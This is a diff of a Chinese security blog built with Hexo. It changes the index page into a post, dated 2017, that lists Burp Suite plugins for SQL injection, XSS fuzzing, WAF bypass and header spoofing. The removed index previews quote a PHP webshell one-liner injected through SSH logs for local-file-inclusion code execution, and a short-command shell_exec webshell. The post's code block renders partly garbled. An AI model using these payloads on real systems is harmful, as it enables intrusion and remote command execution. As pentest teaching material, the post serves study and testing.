@@ -14,11 +14,11 @@
     <script async defer src="https://buttons.github.io/buttons.js"></script>
     <title>
         
-          Rootclay
+          [Tools] Burpsuite 重要插件 - Rootclay
         
     </title>
 
-    <link rel="canonical" href="http://rootclay.com/">
+    <link rel="canonical" href="http://rootclay.com/2017/06/24/burp/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -69,8 +69,8 @@
 <style type="text/css">
     header.intro-header{
         
-            background-image: url('/img/header_img/home-bg-2-dark.png') 
-            /*config*/
+            background-image: url('Demo.png')
+            /*post*/
         
     }
     
@@ -87,10 +87,20 @@
             <div class="row">
                 <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                 
-                    <div class="site-heading">
-                        <h1>ROOTCLAY</h1>
-                        <!--<hr class="small">-->
-                        <span class="subheading">Only when you plant the flowers can you really smell their fragrance.</span>
+                    <div class="post-heading">
+                        <div class="tags">
+                            
+                              <a class="tag" href="/tags/#Tools" title="Tools">Tools</a>
+                            
+                              <a class="tag" href="/tags/#Web" title="Web">Web</a>
+                            
+                        </div>
+                        <h1>[Tools] Burpsuite 重要插件</h1>
+                        <h2 class="subheading">一些常见的burp插件.</h2>
+                        <span class="meta">
+                            Posted by Rootclay on
+                            2017-06-24
+                        </span>
                     </div>
                 
 
@@ -193,323 +203,212 @@
 
 
     <!-- Main Content -->
-    <!-- Main Content -->
-<div class="container">
-    <div class="row">
-        
+    <!-- Modify by Yu-Hsuan Yen -->
 
-<!-- USE SIDEBAR -->
-    <!-- Post Container -->
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Post Container -->
             <div class="
-                col-lg-8 col-lg-offset-1
-                col-md-8 col-md-offset-1
-                col-sm-12
-                col-xs-12
-                post-container
-            ">
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="burpsuite-重要插件">Burpsuite 重要插件</h1>
+<ol>
+<li>
+<p>Gason：Burpsuite-sqlmap插件，该插件可以让burp与sqlmap轻松对接，深度发掘SQL注入漏洞.</p>
+</li>
+<li>
+<p>fuzzdb：fuzzing测试数据库，开源，深度测试SQL注入，xss，文件上传/解析等漏洞（结合intruder使用）.</p>
+<ol>
+<li><a href="https://github.com/fuzzdb-project/fuzzdb" target="_blank" rel="external">Fuzzdb</a></li>
+</ol>
+</li>
+<li>
+<p>bypasswaf：让你轻松绕过waf防御（不要迷信waf）.</p>
+<ol>
+<li>
+<p>添加好插件后，在project option中设置sesions，添加bypass waf，并针对所有的url进行变换</p>
+</li>
+<li>
+<p>参数详解在<a href="http://www.rootclay.club/?p=166" target="_blank" rel="external">参考</a></p>
+</li>
+</ol>
+</li>
+<li>
+<p>xssValidator： Github项目地址<a href="https://github.com/nVisium/xssValidator" target="_blank" rel="external">xssValidator</a></p>
+<ol>
+<li>
+<p>添加插件后，在爆破时选择Extension-generatted</p>
+</li>
+<li>
+<p>payload选项，选择xss Validator</p>
+</li>
+<li>
+<figure class="highlight plain"><figcaption><span>E:\burp\exp\xssValidator-master\xss.js```启动在本地8093端口</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">	4. 开始测试</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">5. Random Header：对Herder中的一些字段进行修改，绕过简单的IP检测等</div><div class="line"></div><div class="line">```http</div><div class="line">	本地访问服务器，开启random header</div><div class="line">	服务端监听</div><div class="line">	sudo nc -l -p 2333</div><div class="line"></div><div class="line">	结果如下：</div><div class="line">	GET / HTTP/1.1</div><div class="line">	Host: 192.168.32.136:808</div><div class="line">	Upgrade-Insecure-Requests: 1</div><div class="line">	User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3013.3 Safari/537.36</div><div class="line">	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">	Accept-Encoding: gzip, deflate, sdch</div><div class="line">	Accept-Language: zh-CN,zh;q=0.8</div><div class="line">	Connection: close</div><div class="line">	X-Forwarded-For: 10.190.47.162</div><div class="line">	X-Forwarded: 172.16.100.100</div><div class="line">	Client-IP: 192.168.0.142</div><div class="line">	Cluster-Client-IP: 127.0.0.1</div><div class="line">	True-Client-IP: 2a02:f404:9942:7b9c:1db3:7503:0149:8d83</div></pre></td></tr></table></figure>
+</li>
+</ol>
+</li>
+<li>
+<p>CO2：集成工具sql注入，生成shell，生成字典等等功能</p>
+<ol>
+<li>SQLMaper可视化定制sql语句</li>
+<li>Luadanum为SHELL生成器</li>
+<li>User Generator用户名生成器</li>
+<li>Name Generator账户名生成器</li>
+<li>CeWler根据返回HTMl的内容生成用户名</li>
+<li>Masher生成结合密码</li>
+<li>BasicAuther用户名密码生成BASE64</li>
+</ol>
+</li>
+</ol>
+
+                
+
+                <hr>
+                <!-- Pager -->
+                <ul class="pager">
+                    
+                    
+                        <li class="next">
+                            <a href="/2017/03/18/hexo-theme-beantech/" data-toggle="tooltip" data-placement="top" title="[Hexo] Theme BeanTech">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                <!-- duoshuo Share start -->
+                
+                <!-- 多说 Share end-->
+
+                <!-- 多说评论框 start -->
+                
+                <!-- 多说评论框 end -->
+
+                <!-- disqus comment start -->
+                
+                    <div class="comment">
+                        <div id="disqus_thread" class="disqus-thread"></div>
+                    </div>
+                
+                <!-- disqus comment end -->
+            </div>
             
-                <!-- Main Content -->
+            <!-- Tabe of Content -->
+            <!-- Table of Contents -->
 
-
-<div class="post-preview">
-
-    <a href="/2017/06/24/burp/">
-        <h2 class="post-title">
-            [Tools] Burpsuite 重要插件
-        </h2>
-        <h3 class="post-subtitle">
-            一些常见的burp插件.
-        </h3>
-        <div class="post-content-preview">
-            Burpsuite 重要插件
-
-
-Gason：Burpsuite-sqlmap插件，该插件可以让burp与sqlmap轻松对接，深度发掘SQL注入漏洞.
-
-
-fuzzdb：fuzzing测试数据库，开源，深度测试SQL注入，xss，文件上传/解析等漏洞（结合intruder使用）.
-
-Fuzzdb
-
-
-
-bypasswaf：让你轻松绕过waf防御（不要迷信waf）.
-
-
-添加好插件后，在pr......
+    
+      <aside id="sidebar">
+        <div id="toc" class="toc-article">
+        <strong class="toc-title">Contents</strong>
+        
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#burpsuite-重要插件"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">Burpsuite 重要插件</span></a></li></ol>
+        
         </div>
-    </a>
-    
-        <p class="post-meta" style="margin: 10px 0;">
-            Posted by Rootclay on
-            2017-06-24
-        </p>
-        <div class="tags">
-            
-              <a href="/tags/#Tools" title="Tools">Tools</a>
-            
-              <a href="/tags/#Web" title="Web">Web</a>
-            
-        </div>
+      </aside>
     
 
-</div>
-<hr>
+                
+            <!-- Sidebar Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
 
-<div class="post-preview">
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#Tools" title="Tools">Tools</a>
+                        
+                          <a class="tag" href="/tags/#Web" title="Web">Web</a>
+                        
+                    </div>
+                </section>
+                
 
-    <a href="/2017/03/18/hexo-theme-beantech/">
-        <h2 class="post-title">
-            [Hexo] Theme BeanTech
-        </h2>
-        <h3 class="post-subtitle">
-            This is hexo theme Demo.
-        </h3>
-        <div class="post-content-preview">
-            
-Ported Theme of Hux Blog, Thank Huxpro for designing such a flawless theme.
-This BeanTech theme created by YuHsuan modified from the original Porter Kaijun
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
 
-Live Demo
-
-
-Usage
-
-I publish the whole ......
-        </div>
-    </a>
-    
-        <p class="post-meta" style="margin: 10px 0;">
-            Posted by Rootclay on
-            2017-03-18
-        </p>
-        <div class="tags">
-            
-              <a href="/tags/#Hexo" title="Hexo">Hexo</a>
-            
-              <a href="/tags/#Blog" title="Blog">Blog</a>
-            
-        </div>
-    
-
-</div>
-<hr>
-
-<div class="post-preview">
-
-    <a href="/2017/03/18/lfi_ssh/">
-        <h2 class="post-title">
-            [Web] LFI SSH日志
-        </h2>
-        <h3 class="post-subtitle">
-            This is hexo theme Demo.
-        </h3>
-        <div class="post-content-preview">
-            LFI SSH日志
-1ssh '&lt;?php system($_GET[‘c’]); ?&gt;'@192.168.32.137
-1curl http://192.168.32.137/lfi.php?file=/var/log/auth.log&amp;c=ls
-Tips:
-123/var/log/auth.log只有ubuntu系有。其实对linux，可以包含/var/log/wtm......
-        </div>
-    </a>
-    
-        <p class="post-meta" style="margin: 10px 0;">
-            Posted by Rootclay on
-            2017-03-18
-        </p>
-        <div class="tags">
-            
-              <a href="/tags/#Web" title="Web">Web</a>
-            
-              <a href="/tags/#SSH" title="SSH">SSH</a>
-            
-              <a href="/tags/#LFI" title="LFI">LFI</a>
-            
-        </div>
-    
-
-</div>
-<hr>
-
-<div class="post-preview">
-
-    <a href="/2017/03/18/linux_doc_shell/">
-        <h2 class="post-title">
-            [Web] Linux下短字符写shell
-        </h2>
-        <h3 class="post-subtitle">
-            Linux下短字符写shell.
-        </h3>
-        <div class="post-content-preview">
-            Linux下短字符写shell
-代码
-12345&lt;?phpif(strlen($_GET[1]) &lt; 8) &#123;  echo shell_exec($_GET[1]);&#125;?&gt;
-背景知识
-1、linux下写文件
-1a&gt;1.txt
-这样就会在本目录下生成一个1.txt文件，内容会有a
-2、linux下本行无法执行完命令时
-12echo 1&gt;\1.p......
-        </div>
-    </a>
-    
-        <p class="post-meta" style="margin: 10px 0;">
-            Posted by Rootclay on
-            2017-03-18
-        </p>
-        <div class="tags">
-            
-              <a href="/tags/#Web" title="Web">Web</a>
-            
-              <a href="/tags/#Linux" title="Linux">Linux</a>
-            
-        </div>
-    
-
-</div>
-<hr>
-
-
-
-<!-- Pager -->
-
-<ul class="pager">
-    
-    
-</ul>
-
-
-
-                <!-- 如果开启评论功能 -->
+                    
+                        <li><a href="http://beantech.org" target="_blank">Bean Tech</a></li>
+                    
+                        <li><a href="http://blog.kaijun.rocks" target="_blank">Kaijun&#39;s Blog</a></li>
+                    
+                        <li><a href="http://huangxuan.me" target="_blank">Hux Blog</a></li>
+                    
+                        <li><a href="#" target="_blank">It Helps SEO</a></li>
+                    
+                </ul>
                 
             </div>
-
-          <!-- Sidebar Container -->
-<div class="
-    col-lg-3 col-lg-offset-0
-    col-md-3 col-md-offset-0
-    col-sm-12
-    col-xs-12
-    sidebar-container
-">
-    
-        <!-- Short About -->
-<section class="visible-md visible-lg">
-    <h5><a href="/about/">ABOUT ME</a></h5>
-    <div class="short-about">
-
-        
-            <img id = "avatar_pic" src="/img/wechat.png" />
-        
-
-        
-            <p>Let&#39;s Wechat</p>
-        
-
-        <!-- SNS Link -->
-        <ul class="list-inline">
-            
-                <li>
-                    <a href="/feed.xml">
-                        <span class="fa-stack fa-lg">
-                            <i class="fa fa-circle fa-stack-2x"></i>
-                            <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
-                        </span>
-                    </a>
-                </li>
-            
-            
-            
-                <li>
-                    <a target="_blank" href="https://www.zhihu.com/people/xiang-shan-74-8">
-                        <span class="fa-stack fa-lg">
-                            <i class="fa fa-circle fa-stack-2x"></i>
-                            <i class="fa  fa-stack-1x fa-inverse">知</i>
-                        </span>
-                    </a>
-                </li>
-            
-
-            
-                <li>
-                    <a target="_blank" href="http://weibo.com/u/5715481982">
-                        <span class="fa-stack fa-lg">
-                            <i class="fa fa-circle fa-stack-2x"></i>
-                            <i class="fa fa-weibo fa-stack-1x fa-inverse"></i>
-                        </span>
-                    </a>
-                </li>
-            
-
-            
-
-            
-                <li>
-                    <a target="_blank"  href="https://github.com/rootclay">
-                        <span class="fa-stack fa-lg">
-                            <i class="fa fa-circle fa-stack-2x"></i>
-                            <i class="fa fa-github fa-stack-1x fa-inverse"></i>
-                        </span>
-                    </a>
-                </li>
-            
-            
-            
-            
-        </ul>
+        </div>
     </div>
-</section>
-        <hr>
-    
-        
-  <h5>RECENT POSTS</h3>
-  <div class="widget">
-    <ul>
-      
-        <li>
-          <a href="/2017/06/24/burp/">[Tools] Burpsuite 重要插件</a>
-        </li>
-      
-        <li>
-          <a href="/2017/03/18/hexo-theme-beantech/">[Hexo] Theme BeanTech</a>
-        </li>
-      
-        <li>
-          <a href="/2017/03/18/lfi_ssh/">[Web] LFI SSH日志</a>
-        </li>
-      
-        <li>
-          <a href="/2017/03/18/linux_doc_shell/">[Web] Linux下短字符写shell</a>
-        </li>
-      
-    </ul>
-  </div>
+</article>
 
-        <hr>
-    
-        <!-- Friends Blog -->
 
-<h5>FRIENDS</h5>
-<ul class="list-inline">
 
-    
-        <li><a href="http://beantech.org" target="_blank">Bean Tech</a></li>
-    
-        <li><a href="http://blog.kaijun.rocks" target="_blank">Kaijun&#39;s Blog</a></li>
-    
-        <li><a href="http://huangxuan.me" target="_blank">Hux Blog</a></li>
-    
-        <li><a href="#" target="_blank">It Helps SEO</a></li>
-    
-</ul>
 
-        <hr>
-    
-</div>
+<!-- disqus embedded js code start (one page only need to embed once) -->
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = "your-disqus-ID";
+    var disqus_identifier = "http://rootclay.com/2017/06/24/burp/";
+    var disqus_url = "http://rootclay.com/2017/06/24/burp/";
 
-        
-    </div>
-</div>
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<!-- disqus embedded js code start end -->
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'hover',
+          placement: 'left',
+          icon: 'ℬ'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
 
 
     <!-- Footer -->
